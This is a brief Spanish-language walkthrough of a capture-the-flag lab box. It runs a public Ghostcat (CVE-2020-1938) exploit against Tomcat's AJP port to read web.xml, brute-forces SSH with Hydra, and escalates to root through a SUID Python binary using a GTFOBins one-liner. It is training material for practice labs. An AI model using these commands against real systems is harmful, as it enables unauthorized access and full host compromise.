## Reconocimiento:

Puerto  22 : SSH

Puerto 8009 : ajp Apache Jserv

Puerto 8080 : Tomcat 9.0.30

En la web no hay mucho, pero buscando la versión en internet tiene un CVE:

https://github.com/dacade/CVE-2020-1938

Lo descargo y lo ejecuto:

```bash
python3 exploit.py 172.17.0.2 -p 8009 -f WEB-INF/web.xml
```

Info:

```bash
Getting resource at ajp13://172.17.0.2:8009/hissec
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>
```

Encontramos el user jerry, así que le aplico un ataque de fuerza bruta con Hydra:

```bash
hydra -l jerry -P <WORDLIST> ssh://172.17.0.2 -t 64
```

Pass : chocolate

## Escalada

Listando SUID encuentro:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
# Info:
/usr/bin/python3.7
```

Gracias GTFO Bins:

```bash
python3.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Listo.
